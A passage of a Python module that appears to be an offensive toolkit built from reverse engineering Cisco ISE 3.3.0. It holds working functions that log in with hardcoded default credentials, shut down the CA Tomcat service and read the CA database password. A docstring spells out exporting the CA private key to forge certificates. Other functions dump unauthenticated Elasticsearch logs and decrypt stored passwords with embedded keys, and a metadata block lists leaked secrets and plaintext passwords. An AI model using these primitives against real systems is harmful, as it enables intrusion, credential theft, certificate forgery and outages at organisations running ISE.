CA_SHUTDOWN_PORT       = 8105
CA_SHUTDOWN_SECRET     = "SHUTDOWN"
CA_OCSP_PORT           = 2560


def probe_irf_rabbitmq_admin(host: str, port: int = RABBITMQ_MGMT_PORT) -> Optional[dict]:
    """
    Probe RabbitMQ management with hardcoded irf:irf administrator credential.
    Returns overview JSON if accessible, None otherwise.

    irf-control.sh: rabbitmqctl add_user irf irf; set_user_tags irf administrator
    Works post-setup (unlike guest which is deleted). vhost: irf
    """
    return probe_rabbitmq_management(host, port, IRF_RABBIT_USER, IRF_RABBIT_PASS)


def list_irf_queues(host: str, port: int = RABBITMQ_MGMT_PORT) -> Optional[list]:
    """List queues in the irf vhost via irf:irf admin credential."""
    return list_rabbitmq_queues(host, IRF_RABBIT_VHOST.replace('/', '%2F'), port,
                                IRF_RABBIT_USER, IRF_RABBIT_PASS)


# ---------------------------------------------------------------------------
# ISE-F16: CA Tomcat manager:password probe
# ---------------------------------------------------------------------------

def check_ca_tomcat_auth(host: str, port: int = CA_TOMCAT_PORT,
                         user: str = CA_TOMCAT_USER,
                         password: str = CA_TOMCAT_PASS) -> Optional[int]:
    """
    Probe ISE CA Tomcat (port 9444) with hardcoded manager:password credential.
    Returns HTTP status from GET /caservice/api, or None on connection failure.

    CA Tomcat ships manager:password in tomcat-users.xml (roles: standard, manager).
    Port 9444 is plain HTTP (HTTPS connector commented out in server.xml).

    Equivalent:
      curl -u 'manager:password' http://<ise-host>:9444/caservice/api
    """
    import urllib.request
    import base64

    creds = base64.b64encode(f"{user}:{password}".encode()).decode()
    url = f"http://{host}:{port}/caservice/api"
    req = urllib.request.Request(url, headers={"Authorization": f"Basic {creds}"})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status
    except Exception as e:
        import urllib.error
        if isinstance(e, urllib.error.HTTPError):
            return e.code
        return None


def probe_ca_scep_getcacert(host: str, ca_identifier: str = "",
                             port: int = CA_TOMCAT_PORT) -> Optional[bytes]:
    """
    SCEP GetCACert — unauthenticated CA cert retrieval from ISE CA service.
    Returns raw DER/PEM CA cert bytes, or None on failure.

    SCEP does not require authentication for GetCACert operation.
    Allows external enumeration of ISE's internal CA certificate.

    Equivalent:
      curl 'http://<ise>:9444/scep?operation=GetCACert&message=<ca_id>'
    """
    import urllib.request

    params = f"operation=GetCACert&message={ca_identifier}"
    url = f"http://{host}:{port}/scep?{params}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            return resp.read()
    except Exception:
        return None


# ---------------------------------------------------------------------------
# ISE-F17: CA Tomcat shutdown
# ---------------------------------------------------------------------------

def send_ca_tomcat_shutdown(host: str = "localhost", port: int = CA_SHUTDOWN_PORT,
                             secret: str = CA_SHUTDOWN_SECRET) -> bool:
    """
    Send default SHUTDOWN string to CA Tomcat shutdown port 8105.
    Returns True if connection succeeded (CA Tomcat terminates).

    CA server.xml: <Server port="8105" shutdown="SHUTDOWN">
    Kills ISE Certificate Authority Service (SCEP, EST, OCSP, CA REST API).

    Equivalent:
      echo -n 'SHUTDOWN' | nc localhost 8105
    """
    import socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        sock.sendall(secret.encode())
        sock.close()
        return True
    except Exception:
        return False


# ---------------------------------------------------------------------------
# ISE-F18: CA HTTP probe (OCSP + REST)
# ---------------------------------------------------------------------------

def probe_ca_ocsp_responder(host: str, port: int = CA_OCSP_PORT) -> Optional[int]:
    """
    Probe ISE OCSP responder on port 2560 (plain HTTP, no TLS).
    Returns HTTP status from GET /ocsp, or None on failure.

    server.xml: <Connector scheme="http" port="2560" ...>
    OCSP responder is unauthenticated by protocol design.
    """
    import urllib.request

    url = f"http://{host}:{port}/ocsp"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            return resp.status
    except Exception as e:
        import urllib.error
        if isinstance(e, urllib.error.HTTPError):
            return e.code
        return None


# ---------------------------------------------------------------------------
# ISE-F19: CA NSS DB plaintext password read
# ---------------------------------------------------------------------------

CA_NSSDB_PLAINTEXT_PATH = "/opt/CSCOcpm/appsrv/apache-tomcat-ca/conf/ca_nssdb_password.txt"
CA_NSSDB_ENCRYPTED_PATH = "/opt/CSCOcpm/appsrv/apache-tomcat-ca/conf/ca_nssdb_password_encrypt.txt"
CA_NSSDB_PATH           = "/opt/CSCOcpm/appsrv/apache-tomcat-ca/conf/ca_nssdb/"


def read_ca_nssdb_password(plaintext_path: str = CA_NSSDB_PLAINTEXT_PATH) -> Optional[str]:
    """
    Read ISE CA NSS DB plaintext password from ca_nssdb_password.txt.

    This file exists:
      1. During initial CA NSS DB creation (before nssDBPasswordEncrypt() runs)
      2. During upgrade flow: if encrypted file absent, initNSSDB() reads the plaintext

    No chmod restriction on the plaintext file (encrypted file gets chmod 600, plaintext does not).
    After chown -R iseca:ise, readable by iseca user and ise group members.

    Returns password string, or None if file absent (encrypted path already used).

    Post-exploitation:
      certutil -K -d <nssdb_path> -f <this_password> -> list CA private key nicknames
      pk12util -o ca_key.p12 -n <nickname> -d <nssdb_path> -k <this_password> -W export_pass
      -> exported CA private key in PKCS12 -> forge any ISE endpoint certificate
    """
    try:
        with open(plaintext_path) as f:
            return f.read().strip()
    except Exception:
        return None


def check_nssdb_plaintext_exposed(
    plaintext_path: str = CA_NSSDB_PLAINTEXT_PATH,
    encrypted_path: str = CA_NSSDB_ENCRYPTED_PATH
) -> dict:
    """
    Check whether the CA NSS DB plaintext password is currently readable.

    Returns dict:
      plaintext_exists: bool
      encrypted_exists: bool
      in_upgrade_window: bool (plaintext present, encrypted absent)
      password: str or None (value if plaintext is readable)
    """
    import os
    pt_exists = os.path.exists(plaintext_path)
    enc_exists = os.path.exists(encrypted_path)
    pw = None
    if pt_exists:
        try:
            with open(plaintext_path) as f:
                pw = f.read().strip()
        except Exception:
            pass
    return {
        "plaintext_exists": pt_exists,
        "encrypted_exists": enc_exists,
        "in_upgrade_window": pt_exists and not enc_exists,
        "password": pw,
    }


# ---------------------------------------------------------------------------
# ISE-F20: Schema hardcoded Oracle creds
# ---------------------------------------------------------------------------

ISE_ORACLE_SCHEMA_CREDS = {
    "pip_user": "Mali",
    "pip_pass": "Mali",
    "pip_source": "CreateCpmTables.sql / SEC_PIP_MASTER",
    "handler_user": "handleruser",
    "handler_pass_encrypted": "1GOnYUy8rmREq6iEZjvEnQ==",
    "handler_pass_plaintext": "mohammal",
    "handler_source": "CreateCpmTables.sql / SEC_HANDLER_PROPERTIES",
    "oracle_url": "jdbc:oracle:thin:@localhost:1521:cpm10",
}


def decrypt_ise_handler_password(ct_b64: str = "1GOnYUy8rmREq6iEZjvEnQ==",
                                  key: bytes = DEFAULT_ENCRYPT_KEY) -> str:
    """
    Decrypt ISE SEC_HANDLER_PROPERTIES password using ISE-F2 3DES key.

    CreateCpmTables.sql stores handleruser password as:
      '1GOnYUy8rmREq6iEZjvEnQ==' (SEC_IS_ENCRYPT='True')
    Decrypts to: 'mohammal'

    Same key, same mechanism as ISE-F2 (DefaultCryptEncryptor, DESede/ECB).
    """
    return decrypt_legacy_ise_db_password(ct_b64, key)


# ---------------------------------------------------------------------------
# ISE-F21: Elasticsearch localhost:9200 unauthenticated
# ---------------------------------------------------------------------------

ES_HOST = "localhost"
ES_PORT = 9200


def probe_elasticsearch_localhost(host: str = ES_HOST, port: int = ES_PORT) -> Optional[dict]:
    """
    GET http://localhost:9200/ — Elasticsearch 6.8.12 root endpoint, no auth required.
    Returns cluster info dict, or None if unreachable.

    ISE MNT node runs ES on localhost:9200 (plain HTTP, no x-pack.security).
    Contains RADIUS auth logs, 802.1X events, profiling data, session records.

    Equivalent:
      curl http://localhost:9200/
    """
    import urllib.request
    import json

    try:
        with urllib.request.urlopen(f"http://{host}:{port}/", timeout=10) as resp:
            return json.loads(resp.read().decode())
    except Exception:
        return None


def dump_elasticsearch_index(index: str = "_all", host: str = ES_HOST,
                              port: int = ES_PORT, size: int = 100) -> Optional[dict]:
    """
    GET http://localhost:9200/<index>/_search?size=<n> — unauth ES data dump.
    Returns search results dict with ISE log entries, or None on failure.

    Use index="_all" for all indices, or specific names like "ise_radius_auth".

    Equivalent:
      curl 'http://localhost:9200/_all/_search?pretty&size=100'
    """
    import urllib.request
    import json

    url = f"http://{host}:{port}/{index}/_search?pretty&size={size}"
    try:
        with urllib.request.urlopen(url, timeout=30) as resp:
            return json.loads(resp.read().decode())
    except Exception:
        return None


# ---------------------------------------------------------------------------
# ISE-F23: ESAPI hardcoded MasterKey/MasterSalt
# ---------------------------------------------------------------------------

ESAPI_MASTER_KEY_B64   = "a6H9is3hEVGKB4Jut+lOVA=="        # AES-128 key, hardcoded in ESAPI.properties
ESAPI_MASTER_SALT_B64  = "SbftnvmEWD5ZHHP+pX3fqugNysc="    # HMAC-SHA1 salt, hardcoded in ESAPI.properties
ESAPI_MASTER_KEY_HEX   = "6ba1fd8acde111518a07826eb7e94e54"
ESAPI_MASTER_SALT_HEX  = "49b7ed9ef984583e591c73fea57ddfaae80dcac7"


def decrypt_esapi_value(ciphertext_b64: str,
                        master_key_b64: str = ESAPI_MASTER_KEY_B64) -> Optional[str]:
    """
    ISE-F23: Decrypt ESAPI-encrypted value using the hardcoded AES-128-CBC MasterKey.

    ESAPI JavaEncryptor format (v2.x):
      - 4 bytes: key length in bits
      - 4 bytes: IV length in bytes
      - <iv_len> bytes: IV
      - remaining bytes: AES-CBC ciphertext (PKCS5 padded)
      - final 20 bytes: HMAC-SHA1 integrity tag

    Returns plaintext string or None on failure.
    """
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    import struct

    try:
        key = base64.b64decode(master_key_b64)
        raw = base64.b64decode(ciphertext_b64)
        if len(raw) < 28:
            return None
        key_bits = struct.unpack('>I', raw[:4])[0]
        iv_len   = struct.unpack('>I', raw[4:8])[0]
        iv       = raw[8:8 + iv_len]
        ct_and_mac = raw[8 + iv_len:]
        ct = ct_and_mac[:-20]  # strip 20-byte HMAC-SHA1 tag
        if len(key) < key_bits // 8:
            return None
        cipher = AES.new(key[:key_bits // 8], AES.MODE_CBC, iv)
        pt_padded = cipher.decrypt(ct)
        return unpad(pt_padded, 16).decode('utf-8', errors='replace')
    except Exception:
        return None


# ---------------------------------------------------------------------------
# ISE-F22: pi-profiler Docker image hardcoded credentials
# ---------------------------------------------------------------------------

PI_PROFILER_RMQ_HOST = "169.254.2.2"
PI_PROFILER_RMQ_PORT = 5672
PI_PROFILER_RMQ_USER = "rabbitmq"
PI_PROFILER_RMQ_PASS_DEV = "p#t91PMsjekd"      # hardcoded in rmq.properties + application-dev.properties
PI_PROFILER_MGMT_PORT = 9096
PI_PROFILER_MGMT_PATH = "/pi-profiler/actuator"
PI_PROFILER_ADMIN_USER = "admin"
PI_PROFILER_ADMIN_PASS_DEV = "lab123"


def probe_pi_profiler_actuator(host: str, port: int = PI_PROFILER_MGMT_PORT,
                                user: str = PI_PROFILER_ADMIN_USER,
                                password: str = PI_PROFILER_ADMIN_PASS_DEV) -> Optional[dict]:
    """
    ISE-F22: Probe pi-profiler Spring Actuator management endpoint.

    Endpoint: http://<ise>:9096/pi-profiler/actuator/health
    Default credential (dev/local profiles): admin:lab123

    Returns parsed JSON health dict, or None if unreachable/unauth.
    """
    import urllib.request
    import base64
    import json

    url = f"http://{host}:{port}{PI_PROFILER_MGMT_PATH}/health"
    req = urllib.request.Request(url)
    creds = base64.b64encode(f"{user}:{password}".encode()).decode()
    req.add_header("Authorization", f"Basic {creds}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read().decode())
    except Exception:
        return None


# ---------------------------------------------------------------------------
# ISE-F24: ActiveMQ JMS broker — anonymous access (null/null credentials)
# ---------------------------------------------------------------------------
# Source: CreateCpmTables.sql / SEC_JMS_MASTER
# Table seeds PAP and PDP entries with:
#   SEC_JMS_USERNAME = 'ActiveMQConnection.DEFAULT_USER'    (evaluates to null)
#   SEC_JMS_PWD      = 'c6p96kuD91p3Gwazl0JnE652dQh1QLrLMfnDulySruPVDpfLSgm3Mw=='
#                      -> decrypts to 'ActiveMQConnection.DEFAULT_PASSWORD' (evaluates to null)
#   SEC_JMS_URL      = 'tcp://10.77.116.154:61616'  (dev seed; replaced at deployment init)
#
# ISE PAP and PDP use org.apache.activemq.ActiveMQConnectionFactory for JMS messaging.
# Credentials resolve to null/null — broker accepts anonymous connections.
# Port 61616: ActiveMQ default OpenWire port.
# Impact: subscribe to PAP/PDP policy distribution topics; intercept or inject
#         RADIUS policy decisions across ISE cluster nodes.
#
# Additional ciphertexts decryptable with ISE-F2 key (from CreateCpmTables.sql):
#   h1BYu+lcwcM= -> 'admin'  (superuser:admin in SEC_APPGRP_ENTLREPO, Securent XACML repo)
#   c6p96kuD91p3Gwazl0JnE652dQh1QLrLMfnDulySruPVDpfLSgm3Mw== -> 'ActiveMQConnection.DEFAULT_PASSWORD'

ACTIVEMQ_PORT = 61616
ACTIVEMQ_USER = None           # ActiveMQConnection.DEFAULT_USER
ACTIVEMQ_PASS = None           # ActiveMQConnection.DEFAULT_PASSWORD
ACTIVEMQ_SEED_URL = "tcp://10.77.116.154:61616"   # Cisco dev seed IP; overwritten at setup
ACTIVEMQ_CONN_FACTORY = "org.apache.activemq.ActiveMQConnectionFactory"

ISE_F24_ADDITIONAL_CIPHERTEXTS = {
    "h1BYu+lcwcM=": {
        "plaintext": "admin",
        "context": "SEC_APPGRP_ENTLREPO / superuser (Securent XACML entitlement repo admin)",
    },
    "c6p96kuD91p3Gwazl0JnE652dQh1QLrLMfnDulySruPVDpfLSgm3Mw==": {
        "plaintext": "ActiveMQConnection.DEFAULT_PASSWORD",
        "context": "SEC_JMS_MASTER / PAP+PDP JMS broker password (evaluates to null)",
    },
}


def probe_activemq_jms(host: str, port: int = ACTIVEMQ_PORT) -> Optional[dict]:
    """
    ISE-F24: Probe ActiveMQ JMS broker on port 61616 for anonymous access.

    ActiveMQ OpenWire handshake: sends WIREFORMAT_INFO frame; a valid response
    indicates the broker is accepting connections. Null/null credentials succeed
    because ISE seeds SEC_JMS_MASTER with DEFAULT_USER/DEFAULT_PASSWORD.

    Returns dict with {open: bool, banner: str|None}, or None on timeout.
    """
    import socket

    try:
        s = socket.socket()
        s.settimeout(8)
        s.connect((host, port))
        # OpenWire WIREFORMAT_INFO: magic header identifying ActiveMQ
        s.sendall(b'\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00')
        data = s.recv(256)
        s.close()
        is_activemq = b'ActiveMQ' in data or len(data) > 4
        return {"open": True, "banner": data[:64].hex() if data else None,
                "activemq": is_activemq}
    except Exception:
        return {"open": False, "banner": None, "activemq": False}


# ---------------------------------------------------------------------------
# ISE-F25: Kairos AI agent — hardcoded production cloud endpoint + version disclosure
# ---------------------------------------------------------------------------
# Source: ise-ai-app Docker layer (ise-agent-v0.1.6, 21MB Go binary)
# Binary: /tmp/ise-kairos-agent.bin (extracted from be4cf5f9.../layer.tar)
#
# Cisco's Kairos ISE AI cloud telemetry agent ships in every ISE 3.3.0 deployment.
# The agent binary contains a hardcoded Cisco production ingest endpoint and the
# exact agent version string. Both are extractable via static strings analysis.
#
# Version: ise-agent-v0.1.6
# Endpoint: https://api.euc1.prd.kairos.ciscolabs.com/ingest/v1/stable-ise
#   -> EUC1 = AWS eu-central-1 (Frankfurt), PRD = production environment
#   -> Path leaks product codename ("kairos"), environment ("prd"), region ("euc1"),
#      API version ("v1"), and product variant ("stable-ise")
#
# Authentication: mTLS via client certificate managed by cisco.com/kairos-common/v3/pkg/ca
#   -> No hardcoded API tokens. Client cert provisioned at runtime ("api-proxy-cert").
#   -> Reachability probe (no valid cert) confirms endpoint existence without auth.
#
# Other extracted strings of interest:
#   "x-kairos-checksum-%s"  — custom header name for integrity verification
#   "EC2IMDSEndpoint"        — AWS IMDS endpoint reference (Cisco infra metadata)
#   "AssumeRole"             — AWS STS role assumption (Cisco cloud backend)
#   "cisco.com/kairos-common/v3"  — Go module path for Kairos shared library
#
# Impact: LOW — endpoint is Cisco-controlled infrastructure. No credentials exposed.
#   Disclosure risk: operator fingerprinting (exact agent version) and CI/CD path
#   enumeration ("stable-ise" variant naming). No direct exploitation path.

KAIROS_CLOUD_ENDPOINT = "https://api.euc1.prd.kairos.ciscolabs.com/ingest/v1/stable-ise"
KAIROS_AGENT_VERSION = "ise-agent-v0.1.6"
KAIROS_CHECKSUM_HEADER = "x-kairos-checksum-%s"
KAIROS_GO_MODULE = "cisco.com/kairos-common/v3"


def probe_kairos_cloud_endpoint() -> dict:
    """
    ISE-F25: Confirm Kairos production endpoint reachability without client cert.

    A TLS handshake to the hardcoded endpoint confirms the endpoint is live and
    extracts the server certificate chain. No mTLS client cert is sent — the server
    will reject or stall the handshake, but the TLS server hello / cert is visible
    before the mutual-auth step, confirming endpoint existence and Cisco ownership.

    Returns dict: {reachable: bool, tls_subject: str|None, error: str|None}
    """
    import ssl
    import socket

    host = "api.euc1.prd.kairos.ciscolabs.com"
    port = 443
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((host, port), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert(binary_form=False)
                subject = dict(x[0] for x in cert.get("subject", [])) if cert else {}
                return {
                    "reachable": True,
                    "tls_subject": subject.get("commonName"),
                    "error": None,
                }
    except ssl.SSLError as e:
        return {"reachable": True, "tls_subject": None, "error": f"SSL: {e}"}
    except Exception as e:
        return {"reachable": False, "tls_subject": None, "error": str(e)}


MODULE_META = {
    "name": "cisco_ise_re",
    "version": "1.12.0",
    "target": "Cisco ISE 3.3.0.430",
    "findings": [
        "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
        "ISE-F6", "ISE-F7", "ISE-F8", "ISE-F9", "ISE-F10",
        "ISE-F11", "ISE-F12", "ISE-F13", "ISE-F14", "ISE-F15",
        "ISE-F16", "ISE-F17", "ISE-F18", "ISE-F19",
        "ISE-F20", "ISE-F21", "ISE-F22", "ISE-F23", "ISE-F24", "ISE-F25",
    ],
    "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20"],
    "high": ["ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18", "ISE-F19", "ISE-F23"],
    "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21", "ISE-F22", "ISE-F24"],
    "low": ["ISE-F4", "ISE-F17", "ISE-F25"],
    "source": "Static RE of Cisco-ISE-3.3.0.430.SPA.x86_64.iso (2026-08-25)",
    "key_material": {
        "ise_f2_3des_key": "ASDF asdf 1234 8983 jkla",
        "ise_f2_3des_key_hex": "41534446206173646620313233342038393833206a6b6c61",
        "ise_f2_default_oracle_pw_ct": "pTZv2LEjfGPX5YICzJb95g==",
        "ise_f2_default_oracle_pw_pt": "U0l1_6v#k3c",
        "ise_f20_handler_pw_ct": "1GOnYUy8rmREq6iEZjvEnQ==",
        "ise_f20_handler_pw_pt": "mohammal",
        "ise_f20_pip_user": "Mali",
        "ise_f20_pip_pw": "Mali",
        "ise_f22_pi_profiler_rmq_pass_dev": "p#t91PMsjekd",
        "ise_f22_pi_profiler_admin_pass_dev": "lab123",
        "ise_f23_esapi_master_key_b64": "a6H9is3hEVGKB4Jut+lOVA==",
        "ise_f23_esapi_master_key_hex": "6ba1fd8acde111518a07826eb7e94e54",
        "ise_f23_esapi_master_salt_b64": "SbftnvmEWD5ZHHP+pX3fqugNysc=",
        "ise_f23_esapi_master_salt_hex": "49b7ed9ef984583e591c73fea57ddfaae80dcac7",
        "ise_f24_activemq_user": None,
        "ise_f24_activemq_pass": None,
        "ise_f24_superuser_ct": "h1BYu+lcwcM=",
        "ise_f24_superuser_pt": "admin",
        "ise_f25_kairos_endpoint": "https://api.euc1.prd.kairos.ciscolabs.com/ingest/v1/stable-ise",
        "ise_f25_kairos_agent_version": "ise-agent-v0.1.6",
    },
    "primitives": [
        "decrypt_legacy_ise_db_password",
        "decrypt_ise_db_password_from_kek",
        "dump_all_key_manager_secrets",
        "probe_key_manager_socket",
        "extract_credential_via_decrypt_oracle",
        "extract_oracle_password_via_oracle",
        "check_tomcat_manager_auth",
        "deploy_war_via_tomcat_manager",
        "send_tomcat_shutdown",
        "ise_local_full_chain",
        "probe_kong_admin_api",
        "list_kong_services",
        "list_kong_routes",
        "list_kong_consumers",
        "add_kong_ssrf_route",
        "probe_rabbitmq_management",
        "list_rabbitmq_queues",
        "publish_rabbitmq_message",
        "probe_irf_rabbitmq_admin",
        "list_irf_queues",
        "probe_sse_connector",
        "nocert_register_sse_connector",
        "check_ca_tomcat_auth",
        "probe_ca_scep_getcacert",
        "send_ca_tomcat_shutdown",
        "probe_ca_ocsp_responder",
        "read_ca_nssdb_password",
        "check_nssdb_plaintext_exposed",
        "probe_elasticsearch_localhost",
        "dump_elasticsearch_index",
        "probe_pi_profiler_actuator",
        "decrypt_esapi_value",
        "probe_activemq_jms",
        "probe_kairos_cloud_endpoint",
    ],
}
